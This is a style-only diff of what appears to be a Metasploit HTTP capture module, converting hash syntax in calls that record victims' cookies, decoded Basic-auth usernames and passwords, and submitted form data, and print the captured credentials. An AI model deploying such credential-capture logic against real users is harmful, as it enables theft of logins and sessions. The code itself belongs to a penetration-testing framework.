@@ -176,10 +176,10 @@ class Metasploit3 < Msf::Auxiliary
 
     if(cookies.length > 0)
       report_note(
-        :host => cli.peerhost,
-        :type => "http_cookies",
-        :data => hhead + " " + cookies,
-        :update => :unique_data
+        host: cli.peerhost,
+        type: "http_cookies",
+        data: hhead + " " + cookies,
+        update: :unique_data
       )
     end
 
@@ -188,20 +188,20 @@ class Metasploit3 < Msf::Auxiliary
       basic,auth = req['Authorization'].split(/\s+/)
       user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
       report_auth_info(
-        :host      => cli.peerhost,
-        :port      => @myport,
-        :sname     => (ssl ? "https" : "http"),
-        :user      => user,
-        :pass      => pass,
-        :source_type => "captured",
-        :active    => true
+        host: cli.peerhost,
+        port: @myport,
+        sname: (ssl ? "https" : "http"),
+        user: user,
+        pass: pass,
+        source_type: "captured",
+        active: true
       )
 
       report_note(
-        :host     => cli.peerhost,
-        :type     => "http_auth_extra",
-        :data     => req.resource.to_s,
-        :update => :unique_data
+        host: cli.peerhost,
+        type: "http_auth_extra",
+        data: req.resource.to_s,
+        update: :unique_data
       )
       print_status("HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
     end
@@ -225,10 +225,10 @@ class Metasploit3 < Msf::Auxiliary
       data = Rex::Text.uri_decode($1).split("\x00").join(", ")
 
       report_note(
-        :host => cli.peerhost,
-        :type => "http_formdata",
-        :data => hhead + " " + data,
-        :update => :unique_data
+        host: cli.peerhost,
+        type: "http_formdata",
+        data: hhead + " " + data,
+        update: :unique_data
       )
 
       res =
@@ -244,10 +244,10 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     report_note(
-      :host => cli.peerhost,
-      :type => "http_request",
-      :data => "#{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers}",
-      :update => :unique_data
+      host: cli.peerhost,
+      type: "http_request",
+      data: "#{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers}",
+      update: :unique_data
     )
 
     print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers} cookies=#{cookies}")
